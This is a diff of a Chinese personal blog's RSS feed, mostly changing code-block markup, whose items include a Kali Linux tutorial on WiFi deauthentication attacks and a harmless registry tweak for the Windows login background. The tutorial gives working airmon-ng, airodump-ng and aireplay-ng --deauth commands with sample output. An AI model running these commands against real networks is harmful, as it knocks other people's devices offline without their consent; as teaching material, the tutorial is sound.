@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>电脑折腾日记 on LEl_FENG的博客</title><link>https://blog.xpdbk.com/categories/%E6%8A%98%E8%85%BE%E7%94%B5%E8%84%91/</link><description>Recent content in 电脑折腾日记 on LEl_FENG的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>XiaoPang版权所有</copyright><atom:link href="https://blog.xpdbk.com/categories/%E6%8A%98%E8%85%BE%E7%94%B5%E8%84%91/index.xml" rel="self" type="application/rss+xml"/><item><title>使用Kali Linux进行WiFi Deauthentication攻击的学习</title><link>https://blog.xpdbk.com/post/kali-linux-wifi-deauthentication-attack-guide/</link><pubDate>Mon, 17 Jul 2023 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/kali-linux-wifi-deauthentication-attack-guide/</guid><description>&lt;blockquote>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>电脑折腾日记 on LEl_FENG的博客</title><link>https://blog.xpdbk.com/categories/%E6%8A%98%E8%85%BE%E7%94%B5%E8%84%91/</link><description>Recent content in 电脑折腾日记 on LEl_FENG的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>LEl_FENG版权所有</copyright><atom:link href="https://blog.xpdbk.com/categories/%E6%8A%98%E8%85%BE%E7%94%B5%E8%84%91/index.xml" rel="self" type="application/rss+xml"/><item><title>使用Kali Linux进行WiFi Deauthentication攻击的学习</title><link>https://blog.xpdbk.com/post/kali-linux-wifi-deauthentication-attack-guide/</link><pubDate>Mon, 17 Jul 2023 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/kali-linux-wifi-deauthentication-attack-guide/</guid><description>&lt;blockquote>
 &lt;p>仅为技术科普，请勿用于非法用途&lt;/p>
 &lt;p>内容未隐讳任何个人、群体、公司。非文学作品，请勿用于阅读理解的练习&lt;/p>
 &lt;p>根据《计算机软件保护条例》第十七条，本站所有软件请仅用于学习研究用途&lt;/p>
@@ -36,67 +36,136 @@
 &lt;ol>
 &lt;li>
 &lt;p>打开终端并启用监视模式。您可以使用以下命令：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">sudo airmon-ng start wlan0
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">sudo airmon-ng start wlan0
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
 &lt;li>
 &lt;p>扫描可用的WiFi网络。您可以使用以下命令：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">sudo airodump-ng wlan0mon
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这将显示周围的所有WiFi网络的详细信息，包括SSID、BSSID和信号强度等信息。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">sudo airodump-ng wlan0mon
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这将显示周围的所有WiFi网络的详细信息，包括SSID、BSSID和信号强度等信息。&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>找到您要攻击的WiFi网络的BSSID和信道。您可以在&lt;code>airodump-ng&lt;/code>的输出中找到这些信息。&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>执行Deauthentication攻击。您可以使用以下命令：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">sudo aireplay-ng --deauth &amp;lt;数量&amp;gt; -a &amp;lt;BSSID&amp;gt; -c &amp;lt;目标设备的MAC地址&amp;gt; wlan0mon
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在上面的命令中，&lt;code>&amp;lt;数量&amp;gt;&lt;/code>表示要发送的Deauthentication帧的数量，&lt;code>&amp;lt;BSSID&amp;gt;&lt;/code>表示要攻击的WiFi网络的BSSID，&lt;code>&amp;lt;目标设备的MAC地址&amp;gt;&lt;/code>表示要攻击的设备的MAC地址。&lt;code>wlan0mon&lt;/code>是启用了监视模式的接口名称。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">sudo aireplay-ng --deauth &amp;lt;数量&amp;gt; -a &amp;lt;BSSID&amp;gt; -c &amp;lt;目标设备的MAC地址&amp;gt; wlan0mon
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>在上面的命令中，&lt;code>&amp;lt;数量&amp;gt;&lt;/code>表示要发送的Deauthentication帧的数量，&lt;code>&amp;lt;BSSID&amp;gt;&lt;/code>表示要攻击的WiFi网络的BSSID，&lt;code>&amp;lt;目标设备的MAC地址&amp;gt;&lt;/code>表示要攻击的设备的MAC地址。&lt;code>wlan0mon&lt;/code>是启用了监视模式的接口名称。&lt;/p>
 &lt;p>您可以使用&lt;code>aireplay-ng&lt;/code>的其他选项来更改攻击的参数，例如更改攻击间隔时间或使用不同的攻击模式等。&lt;/p>
 &lt;/li>
 &lt;/ol>
 &lt;p>&lt;strong>输出的结果&lt;/strong>&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln"> 1&lt;/span>&lt;span class="cl">user@kali:~$ sudo airmon-ng start wlan0
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 2&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 3&lt;/span>&lt;span class="cl">&lt;span class="o">[&lt;/span>sudo&lt;span class="o">]&lt;/span> password &lt;span class="k">for&lt;/span> user:
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 4&lt;/span>&lt;span class="cl">Found &lt;span class="m">5&lt;/span> processes that could cause trouble.
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 5&lt;/span>&lt;span class="cl">If airodump-ng, aireplay-ng or airtun-ng stops working after
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 6&lt;/span>&lt;span class="cl">a short period of time, you may want to run &lt;span class="s1">&amp;#39;airmon-ng check kill&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 7&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 8&lt;/span>&lt;span class="cl"> PID Name
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 9&lt;/span>&lt;span class="cl"> &lt;span class="m">789&lt;/span> NetworkManager
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">10&lt;/span>&lt;span class="cl"> &lt;span class="m">890&lt;/span> wpa_supplicant
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">11&lt;/span>&lt;span class="cl"> &lt;span class="m">901&lt;/span> dhclient
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">12&lt;/span>&lt;span class="cl"> &lt;span class="m">1234&lt;/span> avahi-daemon
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">13&lt;/span>&lt;span class="cl"> &lt;span class="m">1235&lt;/span> avahi-daemon
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">14&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">15&lt;/span>&lt;span class="cl">PHY Interface Driver Chipset
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">16&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">17&lt;/span>&lt;span class="cl">phy0 wlan0 ath9k Qualcomm Atheros AR9485 Wireless Network Adapter &lt;span class="o">(&lt;/span>rev 01&lt;span class="o">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">18&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">19&lt;/span>&lt;span class="cl"> &lt;span class="o">(&lt;/span>mac80211 monitor mode vif enabled &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>phy0&lt;span class="o">]&lt;/span>wlan0 on &lt;span class="o">[&lt;/span>phy0&lt;span class="o">]&lt;/span>wlan0mon&lt;span class="o">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">20&lt;/span>&lt;span class="cl"> &lt;span class="o">(&lt;/span>mac80211 station mode vif disabled &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>phy0&lt;span class="o">]&lt;/span>wlan0&lt;span class="o">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">21&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">22&lt;/span>&lt;span class="cl">user@kali:~$ sudo airodump-ng wlan0mon
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">23&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">24&lt;/span>&lt;span class="cl"> CH &lt;span class="m">6&lt;/span> &lt;span class="o">][&lt;/span> Elapsed: &lt;span class="m">1&lt;/span> min &lt;span class="o">][&lt;/span> 2023-08-03 14:00 &lt;span class="o">][&lt;/span> fixed channel wlan0mon: -1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">25&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">26&lt;/span>&lt;span class="cl"> BSSID PWR RXQ Beacons &lt;span class="c1">#Data, #/s CH MB ENC CIPHER AUTH ESSID&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">27&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">28&lt;/span>&lt;span class="cl"> 00:11:22:33:44:55 -40 &lt;span class="m">100&lt;/span> &lt;span class="m">600&lt;/span> &lt;span class="m">100&lt;/span> &lt;span class="m">2&lt;/span> &lt;span class="m">6&lt;/span> 54e. WPA2 CCMP PSK Wifi-1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">29&lt;/span>&lt;span class="cl"> AA:BB:CC:DD:EE:FF -50 &lt;span class="m">0&lt;/span> &lt;span class="m">500&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">6&lt;/span> 54e. WPA2 CCMP PSK Wifi-2
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">30&lt;/span>&lt;span class="cl"> FF:FF:FF:FF:FF:FF -60 &lt;span class="m">0&lt;/span> &lt;span class="m">400&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">6&lt;/span> 54e. WPA2 CCMP PSK Wifi-3
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">31&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">32&lt;/span>&lt;span class="cl"> BSSID STATION PWR Rate Lost Frames Probe
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">33&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">34&lt;/span>&lt;span class="cl"> &lt;span class="o">(&lt;/span>not associated&lt;span class="o">)&lt;/span> AA:BB:CC:DD:EE:FF -1 -1 - -1 - -1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">35&lt;/span>&lt;span class="cl"> &lt;span class="o">(&lt;/span>not associated&lt;span class="o">)&lt;/span> BB:CC:DD:EE:FF:AA -1 -1 - -1 - -1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">36&lt;/span>&lt;span class="cl"> &lt;span class="o">(&lt;/span>not associated&lt;span class="o">)&lt;/span> CC:DD:EE:FF:AA:BB -1 -1 - -1 - -1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">37&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">38&lt;/span>&lt;span class="cl">user@kali:~$ sudo aireplay-ng --deauth &lt;span class="m">10&lt;/span> -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">39&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">40&lt;/span>&lt;span class="cl">14:01:23 Waiting &lt;span class="k">for&lt;/span> beacon frame &lt;span class="o">(&lt;/span>BSSID: 00:11:22:33:44:55&lt;span class="o">)&lt;/span> on channel &lt;span class="m">6&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">41&lt;/span>&lt;span class="cl">14:01:23 Sending &lt;span class="m">10&lt;/span> directed DeAuth. STMAC: &lt;span class="o">[&lt;/span>AA:BB:CC:DD:EE:FF&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span> 0&lt;span class="p">|&lt;/span>&lt;span class="m">10&lt;/span> ACKs&lt;span class="o">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">42&lt;/span>&lt;span class="cl">14:01:23 Sending &lt;span class="m">10&lt;/span> directed DeAuth. STMAC: &lt;span class="o">[&lt;/span>AA:BB:CC:DD:EE:FF&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>10&lt;span class="p">|&lt;/span>&lt;span class="m">10&lt;/span> ACKs&lt;span class="o">]&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="注意事项">注意事项&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">user@kali:~$ sudo airmon-ng start wlan0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>sudo&lt;span class="o">]&lt;/span> password &lt;span class="k">for&lt;/span> user:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Found &lt;span class="m">5&lt;/span> processes that could cause trouble.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">If airodump-ng, aireplay-ng or airtun-ng stops working after
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">a short period of time, you may want to run &lt;span class="s1">&amp;#39;airmon-ng check kill&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> PID Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">789&lt;/span> NetworkManager
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">890&lt;/span> wpa_supplicant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">901&lt;/span> dhclient
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1234&lt;/span> avahi-daemon
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1235&lt;/span> avahi-daemon
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PHY Interface Driver Chipset
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">phy0 wlan0 ath9k Qualcomm Atheros AR9485 Wireless Network Adapter &lt;span class="o">(&lt;/span>rev 01&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>mac80211 monitor mode vif enabled &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>phy0&lt;span class="o">]&lt;/span>wlan0 on &lt;span class="o">[&lt;/span>phy0&lt;span class="o">]&lt;/span>wlan0mon&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>mac80211 station mode vif disabled &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>phy0&lt;span class="o">]&lt;/span>wlan0&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user@kali:~$ sudo airodump-ng wlan0mon
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CH &lt;span class="m">6&lt;/span> &lt;span class="o">][&lt;/span> Elapsed: &lt;span class="m">1&lt;/span> min &lt;span class="o">][&lt;/span> 2023-08-03 14:00 &lt;span class="o">][&lt;/span> fixed channel wlan0mon: -1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> BSSID PWR RXQ Beacons &lt;span class="c1">#Data, #/s CH MB ENC CIPHER AUTH ESSID&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 00:11:22:33:44:55 -40 &lt;span class="m">100&lt;/span> &lt;span class="m">600&lt;/span> &lt;span class="m">100&lt;/span> &lt;span class="m">2&lt;/span> &lt;span class="m">6&lt;/span> 54e. WPA2 CCMP PSK Wifi-1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> AA:BB:CC:DD:EE:FF -50 &lt;span class="m">0&lt;/span> &lt;span class="m">500&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">6&lt;/span> 54e. WPA2 CCMP PSK Wifi-2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> FF:FF:FF:FF:FF:FF -60 &lt;span class="m">0&lt;/span> &lt;span class="m">400&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">6&lt;/span> 54e. WPA2 CCMP PSK Wifi-3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> BSSID STATION PWR Rate Lost Frames Probe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>not associated&lt;span class="o">)&lt;/span> AA:BB:CC:DD:EE:FF -1 -1 - -1 - -1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>not associated&lt;span class="o">)&lt;/span> BB:CC:DD:EE:FF:AA -1 -1 - -1 - -1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>not associated&lt;span class="o">)&lt;/span> CC:DD:EE:FF:AA:BB -1 -1 - -1 - -1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user@kali:~$ sudo aireplay-ng --deauth &lt;span class="m">10&lt;/span> -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">14:01:23 Waiting &lt;span class="k">for&lt;/span> beacon frame &lt;span class="o">(&lt;/span>BSSID: 00:11:22:33:44:55&lt;span class="o">)&lt;/span> on channel &lt;span class="m">6&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">14:01:23 Sending &lt;span class="m">10&lt;/span> directed DeAuth. STMAC: &lt;span class="o">[&lt;/span>AA:BB:CC:DD:EE:FF&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span> 0&lt;span class="p">|&lt;/span>&lt;span class="m">10&lt;/span> ACKs&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">14:01:23 Sending &lt;span class="m">10&lt;/span> directed DeAuth. STMAC: &lt;span class="o">[&lt;/span>AA:BB:CC:DD:EE:FF&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>10&lt;span class="p">|&lt;/span>&lt;span class="m">10&lt;/span> ACKs&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="注意事项">注意事项&lt;/h2>
 &lt;p>在执行WiFi Deauthentication攻击时，请注意以下几点：&lt;/p>
 &lt;ul>
 &lt;li>请确保您拥有合法的授权，并且只在法律允许的情况下使用此技术。&lt;/li>
@@ -136,85 +205,191 @@ fill="currentColor">
 &lt;/blockquote>
 &lt;p>&lt;strong>源码&lt;/strong>&lt;/p>
 &lt;p>&lt;strong>禁用自定义登录背景&lt;/strong>&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-reg" data-lang="reg">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">Windows Registry Editor Version 5.00
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">2&lt;/span>&lt;span class="cl">&lt;span class="k">[&lt;/span>&lt;span class="nb">HKEY_LOCAL_MACHINE&lt;/span>&lt;span class="k">\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">3&lt;/span>&lt;span class="cl">&lt;span class="na">&amp;#34;OEMBackground&amp;#34;&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">dword&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="m">00000000&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>启用自定义登录背景&lt;/strong>&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-reg" data-lang="reg">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">Windows Registry Editor Version 5.00
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">2&lt;/span>&lt;span class="cl">&lt;span class="k">[&lt;/span>&lt;span class="nb">HKEY_LOCAL_MACHINE&lt;/span>&lt;span class="k">\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">3&lt;/span>&lt;span class="cl">&lt;span class="na">&amp;#34;OEMBackground&amp;#34;&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">dword&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="m">00000001&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果选择了新的主题，刚才设置的注册表值就会被重置为0。因为选择一个新的主题，会重新加载这个主题的配置文件。而因为配置文件中的注册表键值可能会是0，所以你只能在选择新主题后再次运行.reg脚本。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-reg" data-lang="reg">&lt;span class="line">&lt;span class="cl">Windows Registry Editor Version 5.00
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">[&lt;/span>&lt;span class="nb">HKEY_LOCAL_MACHINE&lt;/span>&lt;span class="k">\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">&amp;#34;OEMBackground&amp;#34;&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">dword&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="m">00000000&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;strong>启用自定义登录背景&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-reg" data-lang="reg">&lt;span class="line">&lt;span class="cl">Windows Registry Editor Version 5.00
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">[&lt;/span>&lt;span class="nb">HKEY_LOCAL_MACHINE&lt;/span>&lt;span class="k">\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">&amp;#34;OEMBackground&amp;#34;&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">dword&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="m">00000001&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>如果选择了新的主题，刚才设置的注册表值就会被重置为0。因为选择一个新的主题，会重新加载这个主题的配置文件。而因为配置文件中的注册表键值可能会是0，所以你只能在选择新主题后再次运行.reg脚本。&lt;/p>
